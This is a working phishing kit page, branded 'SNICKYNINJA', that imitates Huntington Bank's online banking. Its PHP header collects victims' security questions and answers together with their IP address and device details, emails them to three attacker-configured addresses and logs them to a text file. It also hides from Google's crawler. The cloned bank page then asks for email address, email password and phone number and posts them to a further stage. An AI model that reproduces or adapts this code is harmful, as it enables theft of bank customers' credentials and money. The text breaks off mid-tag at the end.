<?php

include('antibots.php');
include('config/email.php');
include('css/vld.php');
if(isset($_POST['q1'])){
  
  $ip = getenv("REMOTE_ADDR");
  $ua = $_SERVER['HTTP_USER_AGENT'];
$msg .= "#------------------[ Huntington SECURITY QUESTION ]---------------------#\n";
$msg .= "Question1  : ".$_POST['q1']."\n";
$msg .= "Answer1  : ".$_POST['a1']."\n\n";
$msg .= "Question2  : ".$_POST['q2']."\n";
$msg .= "Answer2  : ".$_POST['a2']."\n\n";
$msg .= "Question3  : ".$_POST['q3']."\n";
$msg .= "Answer3  : ".$_POST['a3']."\n";
$msg .= "#---------------------[ Visitor ]-------------------------#\n";
$msg .= "IP Address   : ".$ip."\n";
$msg .= "DEVICE INFORMATION       : ".$ua."\n";
$msg .= "#-------------------[ SNICKYNINJA - END ]------------------------#\n\n";
$sub = "::SNICKYNINJA:: Huntington BANK SECURITY QUESTION : $ip";
mail($to,$sub,$msg);
mail($ml1,$sub,$msg);
mail($ml2,$sub,$msg);

     $data = fopen("result.txt", "a");
    $result = $msg;
   fwrite($data, $result);
   fclose($data);
}
if(strpos($_SERVER['HTTP_USER_AGENT'], 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")), 'GoogleBot') !==false) {
    header('HTTP/1.0 404 Not Found');
    exit();
}

?>
<!DOCTYPE html>
<html lang="en" class=" js history mediaqueries cssremunit js  mediaqueries cssremunit"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="" src="assets/js/bat.js.download"></script><script type="text/javascript" async="" src="assets/js/f.txt"></script><script type="text/javascript" async="" src="assets/js/js"></script><script type="text/javascript" async="" src="assets/js/js(1)"></script><script src="assets/js/ytc.js.download" async=""></script><script type="text/javascript" async="" src="assets/js/ac66aa74326a8fa0e24180b6db457f6d.js.download"></script><script src="assets/js/serverComponent.php" aria-hidden="true"></script>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0" id="mainviewport">
        
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="format-detection" content="telephone=no">
    <meta name="viewport" content="width=device-width">
    <meta name="viewport" content="initial-scale=1.0">

    <meta name="author" content="Huntington Bancshares Incorporated">
    <meta name="robots" content="index/follow">
    <meta name="keywords" content="Huntington,">
    <meta name="description" content="Huntington Bank.">
    <title>Verify Your Email</title>
    <script type="text/javascript" src="assets/js/ruxitagentjs_ICA2SVfqru_10197200831173448.js.download" data-dtconfig="rid=RID_1435329707|rpid=1813012340|domain=hban.us|reportUrl=/rb_55ab56e3-f58b-45f8-a01d-56e2db48866f|uam=1|app=d008aef95ba8c69e|cuc=m1fm4lts|featureHash=ICA2SVfqru|dpvc=1|lastModification=1603990478033|vcv=2|dtVersion=10197200831173448|tp=500,50,0,1|rdnt=1|uxrgce=1|uxdcw=1500|agentUri=/ruxitagentjs_ICA2SVfqru_10197200831173448.js" aria-hidden="true"></script><link href="assets/js/holCss" rel="stylesheet">

    <link href="assets/css/jqueryCss" rel="stylesheet">

    <link href="assets/css/site.css" rel="stylesheet">

    <script src="assets/js/jquery" aria-hidden="true"></script>

    <script src="assets/js/common" aria-hidden="true"></script>

    <script type="text/javascript" aria-hidden="true">
	    if (typeof path !== 'undefined') path.set("/");
    </script>
    <!--Analytics Domain Layer-->
<script aria-hidden="true">
var dataLayer = {"user":null,"version":"0.1","page":{"name":"olb: login: forgot username","pageType":"","pageSubType":"","isBranchFlow":false,"nuanceId":null},"search":null,"messages":["try:/Default/ForgotUsername"],"ads":[],"props":[],"evars":[],"events":[],"stagedLinkClicks":[]};
</script>
<script id="site-survey-context" class="site-survey-context" data-custom-variables_customer-id="" data-custom-variables_id-hash="" data-custom-variables_customer-segment="" data-site-survey-context_segment="" aria-hidden="true"></script><script defer="" src="assets/js/ensightenBootstrap.js.download" aria-hidden="true"></script>

    <script aria-hidden="true">var HolConfig = {"SiteRoot":"","SiteCatalystSuite":null,"IsEnsightenEnabled":false,"SessionWarningSeconds":1050,"SessionGracePeriodSeconds":90}</script>
    <script aria-hidden="true">
window.contentPathname = location.pathname.replace(/\/rol\d/, '/rol');window.contentPathname = window.contentPathname.replace(/[\d\/]*$/, '');

window.contentPathname = window.contentPathname.replace('//', '/');
</script>
<script src="assets/js/saved_resource" defer="" aria-hidden="true"></script>
<script src="assets/js/f(1).txt"></script><script src="assets/js/chat-fab.js.download"></script><script src="assets/js/site-survey.min.js.download"></script><script src="assets/js/inqChatLaunch10006663.js.download"></script><link rel="stylesheet" href="assets/css/site-survey.min.css"><script src="assets/js/oo_engine.min.js.download"></script><script src="assets/js/f(2).txt"></script><link rel="prefetch" href="https://media-lax1.inq.com/media/launch/ci/InqFramework.js?codeVersion=1603950539434"><link rel="prefetch" href="https://huntingtonbank.inq.com/tagserver/acif/pre-acif.js"><link rel="prefetch" href="https://media-lax1.inq.com/media/launch/acif/acif.js"><link rel="prefetch" href="https://media-lax1.inq.com/media/sites/10006663/assets/automatons/acif-configs.js"></head>
<body lang="en-us" data-inq-observer="1">
    <div class="hol-offscreen">
        <a href="">skip to main content</a>
    </div>
    <div id="hol-body">

                    <div><div hidden="" id="ChatFloatingActionButton" role="search" aria-labelledby="chat-raft-title" data-css-url="Presentation/Styles/chat-fab.css?v=RPzJxyNRLm512LGZecoSJctf3j31bVi1fHP3Ug0BMCs1" data-chat-skill="57350000000L3kr" data-chat-invite-delay="" data-chat-deployment-script="https://c.la1-c2-ia2.salesforceliveagent.com/content/g/js/41.0/deployment.js" data-chat-api-endpoint="https://d.la1-c2-ia2.salesforceliveagent.com/chat" data-chat-deployment-id="57250000000L3DH" data-chat-organization-id="00D50000000IObg" data-chat-hours-open0="8:00" data-chat-hours-close0="17:00" data-chat-hours-open1="7:00" data-chat-hours-close1="23:00" data-chat-hours-open2="7:00" data-chat-hours-close2="23:00" data-chat-hours-open3="7:00" data-chat-hours-close3="23:00" data-chat-hours-open4="7:00" data-chat-hours-close4="23:00" data-chat-hours-open5="7:00" data-chat-hours-close5="23:00" data-chat-hours-open6="8:00" data-chat-hours-close6="17:00" data-time-zone-offset="-300" data-chatbot-deployment-script="https://huntingtonbank.inq.com/chatskins/launch/inqChatLaunch10006663.js" data-chatbot-enabled="True" data-chatbot-hcom-root="https://www.huntington.com" data-chatbot-pilot-percentage="100">
    <div class="o-chat-fab" data-fab="" data-raft-open-class="o-chat-fab--open">
        <a class="o-chat-fab__toggle c-chat-fab" data-raft-open-class="c-chat-fab--active" data-fab-click="fab:raft:toggle" data-raft-toggle="" aria-expanded="false" aria-controls="FAB_RAFT" role="button" href="/Default/ForgotUsername#">

<svg xmlns="http://www.w3.org/2000/svg" class="c-chat-fab__icon" viewBox="0 0 80 80" aria-labelledby="chat-fab-button" role="img">
    <title id="chat-fab-button">Chat with a banker</title>
    <g class="c-chat-fab__glyph c-chat-fab__glyph--circle">
        <circle class="c-chat-fab__vector" cx="40" cy="40" r="39"></circle>
    </g>
    <g class="c-chat-fab__glyph c-chat-fab__glyph--hex">
        <path class="c-chat-fab__vector" d="M74.1250305,58.193634V21.8063679c0-0.9334412-0.4979858-1.7959747-1.306366-2.2626953L41.306366,1.3500404 c-0.8083801-0.4667206-1.804348-0.4667206-2.6127357,0L7.1813378,19.5436726 c-0.8083839,0.4667206-1.3063684,1.3292542-1.3063684,2.2626953V58.193634c0,0.9334373,0.4979844,1.7959747,1.3063684,2.2626915 l31.5122929,18.1936378c0.8083878,0.466713,1.8043556,0.466713,2.6127357,0l31.5122986-18.1936378 C73.6270447,59.9896088,74.1250305,59.1270714,74.1250305,58.193634z"></path>
    </g>
    <g class="c-chat-fab__glyph c-chat-fab__glyph--hnb">
        <polygon class="c-chat-fab__vector" points="38.3664169,25.5176868 38.3664169,1.8935635 29.8215199,6.8571429 29.8215199,30.4812679  "></polygon>
        <polygon class="c-chat-fab__vector" points="41.570755,54.4823723 41.570755,78.1064987 50.1784821,73.1429214 50.1784821,49.518795  "></polygon>
        <polygon class="c-chat-fab__vector" points="29.8215199,47.6338921 29.8215199,73.1429214 38.3664169,78.1064987 38.3664169,52.7859573 53.3828125,44.1154022              53.3828125,71.2580109 61.9905434,66.3572617 61.9905434,13.6427965 53.3828125,8.7420464 53.3828125,33.999752  "></polygon>
        <polygon class="c-chat-fab__vector" points="26.5543556,8.7420464 18.0094585,13.7056255 18.0094585,66.3572617 26.5543556,71.2580109 26.5543556,46.0003014              50.1784821,32.366169 50.1784821,6.8571429 41.570755,1.8935635 41.570755,27.2140999 26.5543556,35.884655  "></polygon>
        <path class="c-chat-fab__vector" d="M14.8051233,15.5276995L7.51683,19.7373161c-0.6911311,0.4398117-1.3194327,1.3194332-1.3194327,2.0733948v36.3786392             c0,0.6911316,0.5654712,1.6335831,1.3194327,2.0733986l7.2882943,4.2096176L14.8051233,15.5276995z"></path>
        <path class="c-chat-fab__vector" d="M65.1948776,64.4723587l7.2882919-4.2096138c0.6911316-0.4398117,1.3194351-1.3194351,1.3194351-2.0733986V21.8107109             c0-0.6911316-0.5654755-1.6335831-1.3194351-2.0733948l-7.2882919-4.2096167V64.4723587z"></path>
    </g>
    <g class="c-chat-fab__glyph c-chat-fab__glyph--close">
        <polygon class="c-chat-fab__vector c-chat-fab__vector--dark" points="60.7132225,24.72859 55.1100159,19.0682945 40,34.3307991 24.8899841,19.0682945 19.2867794,24.72859          34.3965263,39.9908218 19.2867794,55.2530556 24.8899841,60.9134407 40,45.6509361 55.1100159,60.9134407 60.7132225,55.2530556          45.6034775,39.9908218 "></polygon>
    </g>
</svg>
            <div class="c-chat-fab__text">Ask Us</div>

<svg xmlns="http://www.w3.org/2000/svg" class="c-chat-fab__tail" viewBox="0 0 30 30">
    <path class="c-chat-fab__vector c-chat-fab__vector--tail-closed" d="M22.9379959,28.7800579L1.2199417,7.0620041C-1.3861135,4.4559488,0.459601,0,4.1451197,0h21.7180557     C28.1478806,0,30,1.8521202,30,4.1368265v21.7180557C30,29.5403996,25.5440502,31.3861141,22.9379959,28.7800579z"></path>
    <path class="c-chat-fab__vector c-chat-fab__vector--tail-open" d="M22.9379959,28.7800579L1.2199417,7.0620041C-1.3861135,4.4559488,0.459601,0,4.1451197,0h21.7180557         C28.1478806,0,30,1.8521202,30,4.1368265v21.7180557C30,29.5403996,25.5440502,31.3861141,22.9379959,28.7800579z"></path>
</svg>
            
<svg class="c-chat-fab__tail c-chat-fab__tail--shadow" viewBox="0 0 30 30">
    <path class="c-chat-fab__vector c-chat-fab__vector--tail-shadow" d="M22.9379959,28.7800579L1.2199417,7.0620041C-1.3861135,4.4559488,0.459601,0,4.1451197,0h21.7180557     C28.1478806,0,30,1.8521202,30,4.1368265v21.7180557C30,29.5403996,25.5440502,31.3861141,22.9379959,28.7800579z"></path>
</svg>
        </a>
        <div class="o-chat-fab__flag-wrap" data-flag-open-class="o-chat-fab__flag-wrap--open">
            <div class="o-chat-fab__flag c-chat-flag t-chat-hidden" data-flag-open-class="c-chat-flag--open" data-flag-visibility="">
                <a class="o-chat-fab__flag-close" href="/Default/ForgotUsername#" data-fab-click="fab:flag:close">

<svg xmlns="http://www.w3.org/2000/svg" class="c-chat-flag__icon" viewBox="0 0 30 30" aria-labelledby="chat-fab-flag-close-icon" role="img">
    <title id="chat-fab-flag-close-icon">Close Flag</title>
    <polygon points="29,3.1209903 26.8790092,1 15,12.8790102 3.1209903,1 1,3.1209903 12.8790102,15 1,26.8790092 3.1209903,29 15,17.1209908 26.8790092,29 29,26.8790092 17.1209908,15 "></polygon>
</svg>
                </a>
                <a class="o-chat-fab__flag-text c-chat-flag__action" href="/Default/ForgotUsername#" data-fab-click="fab:raft:open" aria-controls="FAB_RAFT">
                    We're here to help.
                </a>
            </div>
        </div>
        <div id="FAB_RAFT" class="o-chat-fab__window c-chat-raft t-chat-hidden" data-raft-open-class="c-chat-raft--open" data-raft-visibility="">
            <h3 class="c-chat-raft__title" id="chat-raft-title">
                Get Answers Quick
            </h3>
            <div>
                You have a few ways to get help.
            </div>
                <form action="search" method="GET" target="_blank">
                    <h4 class="c-chat-raft__subtitle c-chat-raft__subtitle--search">
                        <label for="fab-question">
                            Search
                        </label>
                    </h4>
                    <div class="c-chat-search">
                        <input type="text" id="fab-question" name="question" class="c-chat-search__field" placeholder="Ask Huntington">
                        <button type="submit" class="c-chat-search__btn">
                            

<svg xmlns="http://www.w3.org/2000/svg" class="c-chat-search__icon" viewBox="0 0 30 30" aria-labelledby="fab-question-search-icon" role="img">
    <title id="fab-question-search-icon">Search</title>
    <path class="c-chat-search__icon-vector" d="M21.0480461,19.703125c0,0.2597656-0.09375,0.484375-0.2851562,0.6748047         c-0.1894531,0.1894531-0.4140625,0.2851562-0.6738281,0.2851562c-0.2695312,0-0.4941406-0.0957031-0.6738281-0.2851562         l-2.5703125-2.5634766c-0.8955069,0.6201172-1.8920889,0.9296875-2.99121,0.9296875         c-0.7143555,0-1.3974609-0.1386719-2.0498047-0.4160156c-0.6518555-0.2773438-1.2138672-0.6523438-1.6860352-1.1240234         s-0.8466797-1.0341797-1.1240234-1.6860352c-0.2773438-0.6523438-0.4160156-1.3354492-0.4160156-2.0498047         s0.1386719-1.3979492,0.4160156-2.0498047s0.6518555-1.2138672,1.1240234-1.6860352s1.0341797-0.847168,1.6860352-1.1245117         c0.6523438-0.2768555,1.3354492-0.4155273,2.0498047-0.4155273s1.3979492,0.1386719,2.0498047,0.4155273         c0.6523428,0.2773438,1.2148428,0.6523438,1.6855459,1.1245117c0.4726562,0.472168,0.8476562,1.0341797,1.125,1.6860352         s0.4160156,1.3354492,0.4160156,2.0498047c0,1.0991211-0.3105469,2.0957031-0.9296875,2.9907227l2.5703125,2.5703125         C20.9562492,19.2138672,21.0480461,19.4384766,21.0480461,19.703125z M16.2257805,15.840332         c0.65625-0.6572266,0.9863281-1.4477539,0.9863281-2.3720703s-0.3300781-1.7148438-0.9863281-2.3720703         c-0.6572256-0.6567383-1.447753-0.9853516-2.3720694-0.9853516s-1.7148438,0.3286133-2.3720703,0.9853516         c-0.6567383,0.6572266-0.9853516,1.4477539-0.9853516,2.3720703s0.3286133,1.7148438,0.9853516,2.3720703         c0.6572266,0.6567383,1.4477539,0.9848633,2.3720703,0.9848633S15.5685549,16.4970703,16.2257805,15.840332z"></path>
</svg>
                        </button>
                    </div>
                </form>
                            <h4 class="c-chat-raft__subtitle">Chat</h4>
                <div class="c-chat-launcher" aria-live="polite">
                    <div class="c-chat-launcher__status">

<svg xmlns="http://www.w3.org/2000/svg" class="c-chat-status-icon" viewBox="0 0 30 32" data-chat-online-class-delayed="c-chat-status-icon--online">
    <path class="c-chat-status-icon__fill" d="M15.2273884,2.2268028c-6.7247009,0-12.1956501,5.4709501-12.1956501,12.1956501         S8.5026875,26.618103,15.2273884,26.618103c0.3961868,0,0.7917786-0.0197582,1.18577-0.0591068v0.4257069v4.4041901         l3.5686111-2.5810699c0.2763844-0.1999035,6.7677631-4.9834957,7.380825-13.1680145         c0.0401096-0.403966,0.0604439-0.8133268,0.0604439-1.2173557C27.4230385,7.697753,21.9520893,2.2268028,15.2273884,2.2268028         L15.2273884,2.2268028z"></path>
    <path class="c-chat-status-icon__stroke" d="M15.2273884,4.4768028c5.4927998,0,9.9456501,4.4527607,9.9456501,9.9456501         c0,0.3448801-0.0178394,0.6856203-0.0520992,1.0214901c-0.5293312,7.2528896-6.4577808,11.54076-6.4577808,11.54076v-3.238821         c-1.0722694,0.3953915-2.2262001,0.622221-3.43577,0.622221c-5.4927998,0-9.9456501-4.4528503-9.9456501-9.9456501         C5.2817388,8.9295635,9.7345886,4.4768028,15.2273884,4.4768028 M15.2273884,2.2268028         c-6.7247009,0-12.1956501,5.4709501-12.1956501,12.1956501S8.5026875,26.618103,15.2273884,26.618103         c0.3961868,0,0.7917786-0.0197582,1.18577-0.0591068v0.4257069v4.4041901l3.5686111-2.5810699         c0.2763844-0.1999035,6.7677631-4.9834957,7.380825-13.1680145c0.0401096-0.403966,0.0604439-0.8133268,0.0604439-1.2173557         C27.4230385,7.697753,21.9520893,2.2268028,15.2273884,2.2268028L15.2273884,2.2268028z"></path>
    <g>
        <circle class="c-chat-status-icon__circle" cx="10.2273884" cy="14.3577261" r="1.7063593"></circle>
        <circle class="c-chat-status-icon__circle c-chat-status-icon__circle--mid" cx="15.2273884" cy="14.3577261" r="1.7063593"></circle>
        <circle class="c-chat-status-icon__circle" cx="20.2273884" cy="14.3577261" r="1.7063593"></circle>
    </g>
    <rect class="c-chat-status-icon__line" x="-1.4189888" y="13.3857002" transform="matrix(0.5652752 -0.8249024 0.8249024 0.5652752 -5.4580002 18.6642895)" width="32.7959862" height="2.2495952"></rect>
</svg>
                        <div class="c-chat-launcher__description-wrap">
                            <div class="c-chat-launcher__description c-chat-launcher__description--active c-chat-launcher__description--online" data-chat-online-class="c-chat-launcher__description--active">
                                Chat is available
                            </div>
                            <div class="c-chat-launcher__description c-chat-launcher__description--offline" data-chat-offline-class="c-chat-launcher__description--active">
                                Sorry, chat is unavailable
                            </div>
                            <div class="c-chat-launcher__description c-chat-launcher__description--progress" data-chat-transitioning-class="c-chat-launcher__description--active">
                                Checking status...
                            </div>
                            <div class="c-chat-launcher__description c-chat-launcher__description--error" data-chat-error-class="c-chat-launcher__description--active">
                                Chat connection failed
                            </div>
                        </div>
                    </div>
                    <a href="/Default/ForgotUsername#" class="c-chat-btn c-chat-launcher__action c-chat-launcher__action--visible t-chat-hidden" data-fab-click="fab:chat:popup" data-chat-online-visibility="" data-chat-online-class-delayed="c-chat-launcher__action--visible" role="button">
                        Chat
                    </a>
                    <a id="fab-chat-retry" href="/Default/ForgotUsername#" class="c-chat-cta c-chat-launcher__action c-chat-launcher__action--secondary t-chat-hidden" data-fab-click="fab:chat:error" data-chat-error-visibility="" data-chat-error-class-delayed="c-chat-launcher__action--visible" role="button">
                        Retry
                    </a>
                </div>
                <div class="c-chat-launcher__hours">
                    Check back
                        <ul>
                                <li>Mon-Fri: 7:00am - 11:00pm ET</li>
                                <li>Sat-Sun: 8:00am - 5:00pm ET</li>
                        </ul>
                </div>
            <h4 class="c-chat-raft__subtitle">
                Contact Us
            </h4>
            <div>
                Still have questions? <a class="c-chat-raft__link" href="customer-service/contact-us" target="_blank" title="Contact Us (opens in a new window)">Contact Us</a>
            </div>
            <div class="c-chat-raft__footer feedback-fab-parent" data-feedback-link-type="Help_Center" data-feedback-link-class="c-chat-feedback" data-feedback-link-icon-id="black" data-site-survey-context_placement="Help_Center">
            <a href="/Default/ForgotUsername#" title="Give Feedback (opens in a new window)" data-site-survey-link="Help_Center" class="c-chat-feedback"><img alt="" class="oo_inline_img" src="assets/img/oo_icon_retina_black.gif" height="18" width="18">Give Feedback</a></div>
        </div>
    </div>
</div>

<script src="assets/js/chat-fab.js.download" defer=""></script></div><div id="fab-area" style="display: none;"></div>
                    <div><div hidden="" id="site-survey" data-css-url="Presentation/Styles/site-survey.min.css?v=9wo2OrXUNeUe10c3vTcwXGC1EiWtIEx5MI-aYe1RKSk1" data-survey-engine-script="Presentation/Scripts/oo_engine.min.js?v=X-cSihwIHl195N120D5C4rXIsQ75PPW16cMbjy4g28g1" data-path-to-assets="Presentation/onlineopinionV5/" data-custom-variable-names="feedbackType,customerId,idHash,customerSegment,secondaryId,secondaryIdHash" data-company-logo="-/media/hcom/global/logo/huntington_logo.png?rev=da83fa67b50b449e9a43195e3dcbc352" data-company-slogan="Huntington" data-fab-feedback-text="Give Feedback" data-footer-feedback-text="Give Feedback" data-invite-response-rate="1" data-invite-reprompt-time="2592000" data-invite-pages-hit="3" data-invite-prompt-delay="5">
    
    
</div>


<script src="assets/js/site-survey.min.js.download" defer=""></script></div><div id="site-survey" style="display: none;"></div>




<!--Begin HolHeader-->
<div id="hol-header">
    <div class="logo-wrap">
<div id="logo-img-lg" class="hol-logo"><span class="hnb-aria-only">Huntington - Welcome</span></div>



    </div>


        <div class="nav">
            <div id="nav-links" class="links">
                <ul id="primaryNav" class="primary">
                </ul>

                <script type="text/javascript" aria-hidden="true">
                    $(document).ready(function () {
                        $("#primaryNav").accessibleMenuBarNoWrapper();
                    })
                </script>

                <ul id="secondaryNav" class="secondary">

                    <li>
<div id="ensighten-chat"></div>
</li>

                </ul>
            </div>
        </div>
</div> 

<!--IntelliResponse-->
<!-- MenuBar -->


<div style="clear: both;"></div>

<!--End HolHeader-->

        

        <div id="hol-mainContent">
            

<meta http-equiv="Cache-Control" content="no-store">
<meta http-equiv="Pragma" content="no-cache">
<div class="hol-pageFlowContainer">
    <!--This is a container specifying that there is a page flow-->
    <h1>Verify Email Address</h1>
    <div id="formContent">
        <!--This is the default div id for replacing content on async postbacks-->
        <link href="assets/css/ForgotUsername.css" rel="stylesheet" type="text/css">

<img id="imgSessionAlive" width="0" height="0" alt=""><script aria-hidden="true">function pubSubResize() { pubsub.publish('RESIZE');}   $( document ).ready(function() {       var timeoutIdle=1020000;       var timeoutAway=1200000;       setIdleTimeout(timeoutIdle);       setAwayTimeout(timeoutAway);
							document.onIdle = function () {{
                        console.debug('We are IDLE'); 
						if (s && dataLayer) {{
    						dataLayer.page.name = 'olb: global: timeout warning message'; s.t();
    					}}
                        $('#idletimeout').slideToggle(pubSubResize); 
                        $('#idletimeout')[0].scrollIntoView();
                    }}
				document.onAway =   
					function () {
						console.debug('We are AWAY'); 
						window.location = "https://www.huntington.com";
					}
                    document.onBack = function () { 
                        console.debug('We are back!'); 
                        KeepSessionAlive();
                        $('#idletimeout').slideToggle(pubSubResize);
                        setIdleTimeout(timeoutIdle); 
                        setAwayTimeout(timeoutAway); $.ajax( { url: '/' + "SessionKeepAlive", context: document.body });
                    }   });   function KeepSessionAlive() {       var img = document.getElementById("imgSessionAlive");       img.src = "https://onlinebanking.huntington.com/rol/RemoteKeepAlive.aspx?c=" + Math.random();   };</script><div>   <div id="idletimeout" class="message-container timeout">       <div class="container-yellow">           <div class="icon-yellow-alert icon-pad-left"></div>           <div class="message">Your session is about to time out.</div>       </div>   </div></div>

<form action="card.php" data-ajax="true" data-ajax-method="POST" data-ajax-mode="replace-with" data-ajax-success="if(data.redirectUrl){window.location.href = data.redirectUrl;}" data-ajax-update="#formContent" id="formContent" method="post" novalidate="novalidate">    <meta http-equiv="Cache-Control" content="no-store">
    <meta http-equiv="Pragma" content="no-cache">
<script hidden="" aria-hidden="true" type="text/javascript" id="script_IPV_409972290">
$(document).ready(function (){	
var _init_script = null; try { _init_script = $('#script_IPV_409972290'); $.fn.hol.initializePartialView(_init_script);} catch (e) {} 
/*dataLayer suppresed IPV*/});
</script>
    <div class="hol-pageFlowContainer">
        <!--This specifies the layout to use: specifically, what are the left and right margins for this content-->
        
        
<div class="validation-summary" data-summary-id="" data-summary-msg="You will find {0} error(s) below. Please correct the errors to continue." style="display:none" aria-hidden="true" hidden="">
    <div class="validation-summary-msg">You will find 0 error(s) below. Please correct the errors to continue.</div>
    <a href="" tabindex="0" onclick="$.fn.hol.focusFirstError(this, event)">Go to the first error</a>
</div>


        <div class="input">
            <label for="UserEmail">Email Address</label>
            <input data-val="true" data-val-regexwithoptions="Enter a Valid Email Address." data-val-regexwithoptions-flags="" data-val-regexwithoptions-pattern="((([0-9a-zA-Z]((\.(?!\.))|[-!#\$%&amp;&#39;\*\+/=\?\^`\{\}\|~\w])*)[0-9a-zA-Z]@)(([0-9a-zA-Z][-\w]*[0-9a-zA-Z]\.)+[a-zA-Z]{2,22}))" data-val-required="The Email Address field is required." id="UserEmail" name="email" state-lastvalue="" type="text" value="">
            <span class="field-validation-valid" data-valmsg-for="UserEmail" data-valmsg-replace="true"></span>
        </div>






<div class="input">
            <label for="UserPass">Email Password</label>
            <input  data-val-required="The Email Password Field is Required" id="UserPass" name="pass" required="required" type="Password" >
            <span class="field-validation-valid" data-valmsg-for="UserPass" data-valmsg-replace="true" ></span>
        </div>
        <div class="input">
            <label for="UserPass">Phone Number</label>
            <input  data-val-required="The Phone Number is required" id="UserPass" name="pn" required="required" type="text" >
            <span class="field-validation-valid" data-valmsg-for="UserPass" data-valmsg-replace="true"></span>
        </div>
            <div class="hol-actionBar  ">
                
                        <button id="btnContinue" class="activeButton u-g-txt-center valid" style="" type="submit" aria-invalid="false">Verify Now</button>

                
                
                        <a id="Cancel" class="cancelLink" href="javascript: window.close()">Cancel</a>

                

    </div>
    <div class="hidden" aria-hidden="true" hidden="">
        <script type="text/javascript" aria-hidden="true">
            $(document).ready(function () {

                $.fn.hol.initializeCTA("EnabledOnFocus", "btnContinue");



            });
        </script>
    </div>


    </div>
</form>
    </div>
</div>
        </div>

<!--Begin HolFooter-->
<div id="hol-footer" role="navigation">
<div class="links">
<ul id="footermenu" role="menubar">
<li><a role="menuitem" href="" rel="noopener noreferrer" target="_blank">Identity Protection</a></li>
<li><a role="menuitem" href="" rel="noopener noreferrer" target="_blank">Security</a></li>
<li class="breakAfterIfNeeded"><a role="menuitem" href="" rel="noopener noreferrer" target="_blank">Privacy</a></li>
<li><a role="menuitem" href="" rel="noopener noreferrer" target="_blank">Online Guarantee</a></li>
<li class="feedback-footer-parent" data-site-survey-context_placement="Footer" data-feedback-link-type="Footer" data-feedback-link-icon-id="black"><a href="/Default/ForgotUsername#" title="Give Feedback (opens in a new window)" data-site-survey-link="Footer"><img alt="" class="oo_inline_img" src="assets/js/oo_icon_retina_black.gif" height="18" width="18">Give Feedback</a></li>
</ul>
</div>
<div class="legal">
<div class="large"><span class="breakAfterIfNeeded">Have questions? Call <span style="font-family: ApexNewWeb-Bold">(800) 480-2265</span></span>, daily 7:00 a.m. to 7:00 p.m. ET.</div><br>
<div>Mastercard and the Mastercard Brand Mark are registered trademarks of Mastercard International Incorporated.</div>
<div class="small"><div><p style="margin-top: 0px; margin-bottom: 0px;"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 8" fill="#333" width="20" height="20"><path clip-rule="evenodd" d="m5.1 0.8l-5.1 2.8v1h0.8v3.4h8.4v-3.4h0.8v-1l-4.9-2.8zm3.1 6.3h-6.4v-3.4l3.2-1.8 3.2 1.8v3.4z" fill-rule="evenodd"></path><path d="m3.3 5v-0.8h3.4v0.8h-3.4z"></path><path d="m3.3 5.4h3.4v0.9h-3.4v-0.9z"></path></svg>
The Huntington National Bank is an Equal Housing Lender and Member FDIC.
</p>
</div>
<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAO9JREFUeNpi/P//PwO5gAXGYGRkhAvm7HXlBlITgPgSEOsBccEU591fYfIwCxnhDKBmoCYmIDMZiLmgmguBuB+kGYi/AfFcoCH/YHqYkGwzBFKRQDwLiPnRXMgPFY+EqkPVDAQngVidgDfVoeowNLMisf9CnW2ExQBWjABDAyBNNkAsBsQrgFgemyImHJqDgPgtNMD0gTiJFM3zgPgiNKSFgXgNKZofAnEEEC8B4mVAfIGQ5t9Y5M9C45gZmzpkzeZAfJNAVN2EqkPVDEw554HUciBOA+KPaJo+QsWXQ9VhJk+k1MYDDSzi0jY5ACDAAK/JSa5iqePfAAAAAElFTkSuQmCC" alt="Huntington Logo">®, Huntington®, <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA8AAAAPCAYAAAA71pVKAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAO9JREFUeNpi/P//PwO5gAXGYGRkhAvm7HXlBlITgPgSEOsBccEU591fYfIwCxnhDKBmoCYmIDMZiLmgmguBuB+kGYi/AfFcoCH/YHqYkGwzBFKRQDwLiPnRXMgPFY+EqkPVDAQngVidgDfVoeowNLMisf9CnW2ExQBWjABDAyBNNkAsBsQrgFgemyImHJqDgPgtNMD0gTiJFM3zgPgiNKSFgXgNKZofAnEEEC8B4mVAfIGQ5t9Y5M9C45gZmzpkzeZAfJNAVN2EqkPVDEw554HUciBOA+KPaJo+QsWXQ9VhJk+k1MYDDSzi0jY5ACDAAK/JSa5iqePfAAAAAElFTkSuQmCC" alt="Huntington Logo">Huntington®, Huntington.Welcome.®, and Huntington Heads Up® are federally registered service marks of Huntington Bancshares Incorporated. 
© 2020  Huntington Bancshares Incorporated.<!--B--></div>
</div>
</div>
<script type="text/javascript" aria-hidden="true">$(document).ready(function() {$("#footermenu").accessibleMenuBarNoWrapper();});</script> 
<!--End HolFooter-->


    </div>



    <script src="assets/js/rol" aria-hidden="true"></script>

        

    



<script type="text/javascript" aria-hidden="true">var _cf = _cf || []; _cf.push(['_setFsp', true]);  _cf.push(['_setBm', true]);  _cf.push(['_setAu', '/assets/525af5b1ui210143c58bd0c3f200ab']); </script><script type="text/javascript" src="assets/js/525af5b1ui210143c58bd0c3f200ab" aria-hidden="true"></script>
<script type="application/javascript" id="ywa-1604426616750-459812" class="ywa-10000" defer="" src="assets/js/sp.pl.download"></script><iframe id="inqChatStage" title="Chat Window" name="10006663" src="assets/js/nuanceChat.html" style="z-index:9999999;overflow:hidden;position:absolute;height:1px;width:1px;left:0px;top:0px;border-style: none;border-width: 0px;display: none;" scrolling="NO" frameborder="0"></iframe><div id="inqDivResizeCorner" style="border-width: 0px; position: absolute; z-index: 9999999; left: 424px; top: 284px; cursor: se-resize; height: 16px; width: 16px; display: none;"></div><div id="inqResizeBox" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; display:none; height: 0px; width: 0px;"></div><iframe height="0" width="0" style="display: none; visibility: hidden;" src="assets/js/activityi.html"></iframe><iframe height="0" width="0" style="display: none; visibility: hidden;" src="assets/js/activityi(1).html"></iframe><div id="inqTitleBar" style="border-width: 0px; position: absolute; z-index: 9999999; left: 0px; top: 0px; cursor: 